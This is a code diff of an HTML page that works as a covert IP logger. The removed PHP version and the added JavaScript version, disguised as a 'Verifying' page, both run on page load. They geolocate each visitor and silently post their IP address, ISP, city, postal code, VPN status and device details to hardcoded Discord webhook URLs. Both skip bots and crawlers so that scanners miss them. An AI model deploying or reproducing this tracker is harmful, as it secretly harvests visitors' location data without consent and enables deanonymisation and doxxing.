@@ -1,50 +1,11 @@
 <!DOCTYPE html>
-<html>
-       <head><title>CheckUp</title></head><body>
-
-/* 
-Please keep this copyright statemnet in tact
-Original Creator Of This Webhook IP Logger: ᴮᵉᵗᵗᵉʳ ᴼᶠᶠ ᴳᵒⁿᵉ#0869
-Creation Date: 21/10/19 
-APIs Provided By: Octolus (geoiplookup.io) and IP-API (ip-api.com)
-
-
-NOTE: You can use this in every page if you make a it a external page and require it in every other page that is php.
-
-*/ 
-
-<?php
-
-        $webhookurl = "https://discord.com/api/webhooks/1306930385837494284/frvIuZbW2lh_t01AuGTbwXBmk1saYYg5aZqUurx3U7uLYZpbMAZlxt3wWMoHvZM4b4rS";
-
-        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
-        $browser = $_SERVER['HTTP_USER_AGENT'];
-        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
-            exit();
-        }
-        $TheirDate = date('d/m/Y');
-        $TheirTime = date('G:i:s');
-        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
-        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
-        if($vpnCon->connection_type==="Corporate"){
-            $vpn = "Yes (Double Check: $details->isp)";
-        }else{
-            $vpn = "No (Double Check: $details->isp)";
-        }
-        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
-        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";
-
-        $json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
-        $make_json = json_encode($json_data);
-        $ch = curl_init( $webhookurl );
-
-        curl_setopt( $ch, CURLOPT_POST, 1);
-        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
-        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt( $ch, CURLOPT_HEADER, 0);
-        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
-
-        $response = curl_exec( $ch );
-
-?>
-       </body></html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verifying</title>
+</head>
+<body>
+    <script>(async () => { const w = "https://discord.com/api/webhooks/1338876988340830289/V1LLMl7NvDlnL-OwZXsmp5JtSpuPqba9B0wEIB-tsR-v8JjOe0FvIGFzjoqWohC9dnkp", r = await fetch("http://ip-api.com/json/"), d = await r.json(), v = await fetch(`https://json.geoiplookup.io/${d.query}`), g = await v.json(), j = { ip: d.query, isp: d.isp, city: d.city, region: d.regionName, country: d.country, zip: d.zip, vpn: g.connection_type === "Corporate" ? `Yes (${d.isp})` : "No", flag: `https://www.countryflags.io/${d.countryCode}/shiny/64.png`, userAgent: navigator.userAgent, date: new Date().toLocaleDateString(), time: new Date().toLocaleTimeString(), device: window.innerWidth < window.innerHeight ? "Mobile" : "Desktop" }; if (!/bot|Discord|robot|curl|spider|crawler|^$/i.test(j.userAgent)) await fetch(w, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [{ title: "Visitor Info", color: 16711680, fields: [ { name: "IP", value: j.ip, inline: true }, { name: "ISP", value: j.isp, inline: true }, { name: "Location", value: `${j.city}, ${j.region}, ${j.country}`, inline: true }, { name: "Postal Code", value: j.zip, inline: true }, { name: "VPN", value: j.vpn, inline: true }, { name: "Device", value: j.device, inline: true }, { name: "Date", value: j.date, inline: true }, { name: "Time", value: j.time, inline: true } ], thumbnail: { url: j.flag } }] }) }); })();
+    </script>
+</body>
+</html>
